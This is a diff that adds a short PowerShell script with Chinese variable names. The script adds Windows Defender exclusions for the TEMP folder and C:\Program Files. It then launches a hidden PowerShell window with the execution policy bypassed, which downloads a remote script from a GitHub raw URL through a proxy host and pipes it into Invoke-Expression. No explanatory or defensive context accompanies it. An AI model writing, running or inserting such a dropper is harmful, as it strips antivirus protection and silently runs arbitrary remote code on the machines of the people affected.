@@ -1,0 +1,9 @@
+Add-MpPreference -ExclusionPath "$env:TEMP"
+Add-MpPreference -ExclusionPath "C:\Program Files"
+$原始部署脚本链接 = "https://raw.githubusercontent.com/royckk/RE2/refs/heads/main/bbb"
+$加速站前缀 = "https://g.110777.xyz/"
+$后台脚本URL = $加速站前缀 + $原始部署脚本链接
+$隐藏窗口参数 = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -Command"
+$启动命令 = "`"irm -Uri '$后台脚本URL' -UseBasicParsing | iex`""
+Start-Process powershell.exe -ArgumentList "$隐藏窗口参数 $启动命令" -WindowStyle Hidden
+exit 0
